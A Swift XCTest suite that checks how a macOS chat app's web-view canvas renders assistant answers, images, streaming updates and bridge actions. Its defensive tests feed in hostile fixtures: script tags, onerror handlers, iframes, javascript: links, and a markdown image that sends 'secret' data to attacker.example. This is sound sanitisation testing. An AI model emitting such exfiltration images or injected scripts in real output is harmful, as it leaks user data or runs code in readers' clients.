import AppKit
import Foundation
import ThinTalkCore
import XCTest

/// Answers, images, streaming, and bridge traffic in the real conversation canvas:
/// the bundled shell, the vendored renderer, and the asset scheme handler, driven
/// in a real `WKWebView`.
///
/// Every assertion reads the rendered DOM or the bridge traffic rather than source
/// text, because what matters is what a reader sees and what Swift is told. Maths
/// and diagrams live in CanvasMathAndDiagramTests; both suites share CanvasTestCase
/// for the harness. Each wait is bounded, so no case can hang if the page misbehaves.
@MainActor
final class CanvasRenderingTests: CanvasTestCase {
  // MARK: - Rich answers

  func test_should_load_the_shell_with_every_renderer_asset() async throws {
    let harness = try XCTUnwrap(harness)
    let diagnostics = try await harness.pageDiagnostics()
    print("CANVAS-DIAGNOSTICS \(diagnostics)")
    XCTAssertTrue(diagnostics.contains("\"marked\":\"object\""), diagnostics)
    XCTAssertTrue(diagnostics.contains("\"dompurify\":\"function\""), diagnostics)
    XCTAssertTrue(diagnostics.contains("\"morphdom\":\"function\""), diagnostics)
    XCTAssertTrue(diagnostics.contains("\"highlight\":\"object\""), diagnostics)
    for canvasModule in ["trust", "math", "diagrams", "contentKey"] {
      XCTAssertTrue(
        diagnostics.contains("\"\(canvasModule)\":\"object\""),
        "the \(canvasModule) canvas module must load: a partially loaded shell renders nothing"
      )
    }
    XCTAssertEqual(harness.renderingErrors, [], "the shell must load without reporting a failure")
  }

  func test_should_probe_the_bridge_with_a_known_command() async throws {
    let harness = try XCTUnwrap(harness)
    let probe = try await harness.probeReceive()
    print("CANVAS-BRIDGE-PROBE \(probe)")
  }

  func test_should_render_markdown_tables_and_highlighted_code() async throws {
    let harness = try XCTUnwrap(harness)
    let message = TranscriptMessage(
      id: UUID(),
      role: .assistant,
      markdown: """
        ## Residency

        The model stays resident while the ceiling allows it:

        - experts move to disk when the ceiling drops
        - the KV cache follows the same policy

        | Stage | Ceiling |
        | --- | --- |
        | prefill | 20 GB |
        | decode | 20 GB |

        ```swift
        let ceiling = 20
        ```
        """
    )
    try await harness.send(.snapshot(TranscriptSnapshot(messages: [message], channel: "Development")))
    try await harness.waitForElement("article h2")

    let heading = try await harness.text(of: "article h2")
    XCTAssertEqual(heading, "Residency")
    let listItems = try await harness.count(of: "article ul li")
    XCTAssertEqual(listItems, 2)
    let tableRows = try await harness.count(of: "article table tbody tr")
    XCTAssertEqual(tableRows, 2)
    let codeIsHighlighted = try await harness.bool(
      of: "document.querySelector('article pre code').dataset.highlighted === 'true'")
    XCTAssertTrue(codeIsHighlighted, "a fenced code block with a known language must be highlighted")
    let languageLabel = try await harness.text(of: "article .code-block__label")
    XCTAssertEqual(languageLabel, "swift")
  }

  func test_should_render_reasoning_separately_from_the_answer() async throws {
    let harness = try XCTUnwrap(harness)
    let message = TranscriptMessage(
      id: UUID(),
      role: .assistant,
      markdown: "The ceiling applies to the wired limit.",
      reasoning: "Check the configured ceiling before answering."
    )
    try await harness.send(.snapshot(TranscriptSnapshot(messages: [message], channel: "Development")))
    try await harness.waitForElement("article details.reasoning")

    let reasoningText = try await harness.text(of: "article details.reasoning")
    XCTAssertTrue(reasoningText.contains("Check the configured ceiling"))
    let answerText = try await harness.text(of: "article .markdown-body")
    XCTAssertFalse(
      answerText.contains("Check the configured ceiling"),
      "reasoning must never be merged into the visible answer")
  }

  // MARK: - Images

  func test_should_render_attachments_as_one_strip_with_a_count_badge() async throws {
    let harness = try XCTUnwrap(harness)
    let message = TranscriptMessage(
      id: UUID(),
      role: .assistant,
      markdown: "Four views of the same matrix multiplication.",
      attachments: (1...4).map { index in
        TranscriptAttachment(
          assetURL: "thintalk-asset://attachment/token-\(index)", label: "view \(index)")
      }
    )
    try await harness.send(.snapshot(TranscriptSnapshot(messages: [message], channel: "Development")))
    try await harness.waitForElement("[data-testid='attachment-strip']")

    let imageCount = try await harness.count(of: "[data-testid='attachment-strip'] img")
    XCTAssertEqual(imageCount, 4)
    let badge = try await harness.text(of: "[data-testid='attachment-badge']")
    XCTAssertEqual(badge, "4 images")
    let stripCount = try await harness.count(of: "[data-testid='attachment-strip']")
    XCTAssertEqual(stripCount, 1, "a multi-image answer must read as one block, not four")
  }

  func test_should_resolve_attachment_images_through_the_asset_scheme() async throws {
    let harness = try XCTUnwrap(harness)
    let imageURL = try makeTemporaryImage()
    let assetURL = harness.assetRegistry.registerAssetURL(fileURL: imageURL)
    XCTAssertTrue(assetURL.hasPrefix("thintalk-asset://attachment/"))

    let message = TranscriptMessage(
      id: UUID(),
      role: .assistant,
      markdown: "One image.",
      attachments: [TranscriptAttachment(assetURL: assetURL, label: "chart")]
    )
    try await harness.send(.snapshot(TranscriptSnapshot(messages: [message], channel: "Development")))
    try await harness.waitForElement("[data-testid='attachment-strip'] img")

    let loaded = try await harness.waitForImageLoad("[data-testid='attachment-strip'] img")
    XCTAssertTrue(loaded, "a registered attachment must decode from the private asset scheme")
  }

  // MARK: - Model output is untrusted

  func test_should_strip_script_event_handlers_and_dangerous_links_from_model_output() async throws {
    let harness = try XCTUnwrap(harness)
    let hostile = """
      Here is the explanation.

      <script>window.__thintalkPwned = "script";</script>
      <img src="x" onerror="window.__thintalkPwned = 'handler';">
      <iframe src="https://example.com"></iframe>

      [click me](javascript:window.__thintalkPwned = 'link')
      """
    let message = TranscriptMessage(id: UUID(), role: .assistant, markdown: hostile)
    try await harness.send(.snapshot(TranscriptSnapshot(messages: [message], channel: "Development")))
    try await harness.waitForElement("article")

    let executed = try await harness.bool(of: "window.__thintalkPwned !== undefined")
    XCTAssertFalse(executed, "no payload may execute, whether from a tag, an attribute, or a link")
    let scriptNodes = try await harness.count(of: "article script")
    XCTAssertEqual(scriptNodes, 0)
    let frameNodes = try await harness.count(of: "article iframe")
    XCTAssertEqual(frameNodes, 0)
    let eventHandlerAttributes = try await harness.count(of: "article [onerror], article [onload], article [onclick]")
    XCTAssertEqual(eventHandlerAttributes, 0)
    let dangerousLinks = try await harness.count(of: "article a[href^='javascript:']")
    XCTAssertEqual(dangerousLinks, 0)
  }

  func test_should_refuse_remote_images_and_network_access() async throws {
    let harness = try XCTUnwrap(harness)
    let message = TranscriptMessage(
      id: UUID(),
      role: .assistant,
      markdown: "![exfiltrate](https://attacker.example/collect?data=secret)"
    )
    try await harness.send(.snapshot(TranscriptSnapshot(messages: [message], channel: "Development")))
    try await harness.waitForElement("article")

    let remoteImages = try await harness.count(of: "article img[src^='http']")
    XCTAssertEqual(remoteImages, 0, "a remote image is a zero-click exfiltration channel")
    let reachesNetwork = await harness.canReachNetwork()
    XCTAssertFalse(reachesNetwork, "the page must not be able to reach the network at all")
  }

  // MARK: - Streaming

  func test_should_patch_only_the_growing_answer_and_keep_finished_blocks() async throws {
    let harness = try XCTUnwrap(harness)
    let messageID = UUID()
    let code = """
      ```swift
      let ceiling = 20
      ```
      """
    let first = TranscriptMessage(
      id: messageID, role: .assistant, markdown: "First paragraph.\n\n\(code)", state: .streaming)
    try await harness.send(.snapshot(TranscriptSnapshot(messages: [first], channel: "Development")))
    try await harness.waitForElement("article pre code")
    try await harness.setJS("document.querySelector('article pre code').__identity = 'finished'")

    let second = TranscriptMessage(
      id: messageID,
      role: .assistant,
      markdown: "First paragraph, refined.\n\n\(code)",
      state: .streaming
    )
    try await harness.send(.message(second))
    try await harness.waitForParagraph("First paragraph, refined.")

    let codeSurvived = try await harness.bool(
      of: "document.querySelector('article pre code').__identity === 'finished'")
    XCTAssertTrue(codeSurvived, "an unchanged finished block must keep its rendered DOM node")
    let highlightSurvived = try await harness.bool(
      of: "document.querySelector('article pre code').dataset.highlighted === 'true'")
    XCTAssertTrue(highlightSurvived, "highlighting must not be recomputed for an unchanged block")
    let messageCount = try await harness.count(of: "article.message")
    XCTAssertEqual(messageCount, 1)
  }

  // MARK: - Bridge

  func test_should_report_copy_and_regenerate_actions_to_swift() async throws {
    let harness = try XCTUnwrap(harness)
    let messageID = UUID()
    let message = TranscriptMessage(
      id: messageID, role: .assistant, markdown: "Answered locally.", state: .complete)
    try await harness.send(.snapshot(TranscriptSnapshot(messages: [message], channel: "Development")))
    try await harness.waitForElement("[data-testid='action-copy']")

    try await harness.setJS("document.querySelector(\"[data-testid='action-copy']\").click()")
    try await harness.setJS("document.querySelector(\"[data-testid='action-regenerate']\").click()")
    try await harness.waitForReportedActionCount(2)

    let actions = harness.reportedActions
    XCTAssertEqual(actions.first?["action"] as? String, "copy")
    XCTAssertEqual(actions.first?["messageId"] as? String, messageID.uuidString)
    XCTAssertEqual(actions.last?["action"] as? String, "regenerate")
  }

  func test_should_report_a_clicked_link_instead_of_navigating() async throws {
    let harness = try XCTUnwrap(harness)
    let message = TranscriptMessage(
      id: UUID(),
      role: .assistant,
      markdown: "See [the MLX documentation](https://ml-explore.github.io/mlx/)."
    )
    try await harness.send(.snapshot(TranscriptSnapshot(messages: [message], channel: "Development")))
    try await harness.waitForElement("article a[href]")

    try await harness.setJS("document.querySelector('article a[href]').click()")
    try await harness.waitForReportedActionCount(1)

    let action = try XCTUnwrap(harness.reportedActions.first)
    XCTAssertEqual(action["action"] as? String, "openExternal")
    XCTAssertEqual(action["detail"] as? String, "https://ml-explore.github.io/mlx/")
    let stillOnShell = try await harness.bool(
      of: "window.location.protocol === 'thintalk-asset:'")
    XCTAssertTrue(stillOnShell, "clicking a link must never navigate the canvas away from its shell")
  }

  func test_should_remove_a_message_when_the_conversation_no_longer_contains_it() async throws {
    let harness = try XCTUnwrap(harness)
    let first = TranscriptMessage(id: UUID(), role: .user, markdown: "First ask")
    let second = TranscriptMessage(id: UUID(), role: .assistant, markdown: "First answer")
    try await harness.send(
      .snapshot(TranscriptSnapshot(messages: [first, second], channel: "Development")))
    try await harness.waitForMessageCount(2)

    try await harness.send(.snapshot(TranscriptSnapshot(messages: [second], channel: "Development")))
    try await harness.waitForMessageCount(1)

    let remaining = try await harness.text(of: "article .markdown-body")
    XCTAssertTrue(
      remaining.hasPrefix("First answer"),
      "the removed ask must leave the thread; the answer must remain as \(remaining)"
    )
  }

  // MARK: - Support

  /// Renders a full conversation the way the product would and captures it, so the
  /// canvas can be reviewed as an image and not only as a DOM structure. Set
  /// THIN_TALK_CANVAS_SNAPSHOT to keep the PNG for review.
  func test_should_capture_a_reviewable_render_of_a_rich_answer() async throws {
    let harness = try XCTUnwrap(harness)
    let images = try (1...4).map { index in
      TranscriptAttachment(
        assetURL: harness.assetRegistry.registerAssetURL(fileURL: try makeTemporaryImage()),
        label: "view \(index)")
    }
    let conversation = [
      TranscriptMessage(id: UUID(), role: .user, markdown: "How does MLX handle matmul?"),
      TranscriptMessage(
        id: UUID(),
        role: .assistant,
        markdown: """
          MLX dispatches matrix multiplication to the GPU through its own kernels:

          - attention, MLP layers, and KV-cache projections all use `matmul`
          - the same kernels back the streaming path, so a partially resident model \
          keeps identical numerics

          | Stage | Resident | Ceiling |
          | --- | --- | --- |
          | prefill | 19.6 GB | 20 GB |
          | decode | 11.5 GB | 20 GB |

          The expert working set is $W = \\sum_{i=1}^{n} w_i$ per layer, and the
          residency ceiling follows

          $$\\frac{M_{\\text{resident}}}{M_{\\text{total}}} \\leq 1 - \\frac{r}{R}$$

          ```mermaid
          flowchart LR
            probe[Probe shard] --> decide{Ceiling allows?}
            decide -- yes --> resident[Keep expert resident]
            decide -- no --> page[Page from SSD]
          ```

          ```swift
          let ceiling = 20
          let resident = 19.6
          print(resident < Double(ceiling))
          ```

          ![Four views of the tiling strategy](https://attacker.example/collect?data=secret)
          """,
        reasoning: "Confirm the ceiling before answering, then describe the kernel path.",
        attachments: images,
        state: .complete)
    ]
    try await harness.send(
      .snapshot(
        TranscriptSnapshot(
          messages: conversation, model: "Ornith-1.5-35B-A3B-OptiQ-4bit", channel: "Stable")))
    try await harness.waitForElement("[data-testid='attachment-strip']")
    try await harness.waitForElement("article .code-block__label")
    try await harness.waitForElement("article .katex-display .katex")
    try await harness.waitForElement("article figure.diagram svg")

    let png = try await harness.snapshotPNG()
    XCTAssertGreaterThan(png.count, 5_000, "the captured canvas must contain a real render")
    if let outputPath = ProcessInfo.processInfo.environment["THIN_TALK_CANVAS_SNAPSHOT"] {
      try png.write(to: URL(fileURLWithPath: outputPath))
      print("CANVAS-SNAPSHOT \(outputPath) bytes=\(png.count)")
    }
  }

  private func makeTemporaryImage() throws -> URL {
    let directory = URL(fileURLWithPath: NSTemporaryDirectory())
      .appendingPathComponent("thin-talk-canvas-tests", isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    let fileURL = directory.appendingPathComponent("attachment-\(UUID().uuidString).png")
    let image = NSImage(size: NSSize(width: 24, height: 24))
    image.lockFocus()
    NSColor.systemTeal.setFill()
    NSRect(x: 0, y: 0, width: 24, height: 24).fill()
    image.unlockFocus()
    guard
      let data = image.tiffRepresentation,
      let representation = NSBitmapImageRep(data: data),
      let png = representation.representation(using: .png, properties: [:])
    else {
      throw CanvasHarnessError.couldNotBuildFixture
    }
    try png.write(to: fileURL)
    return fileURL
  }
}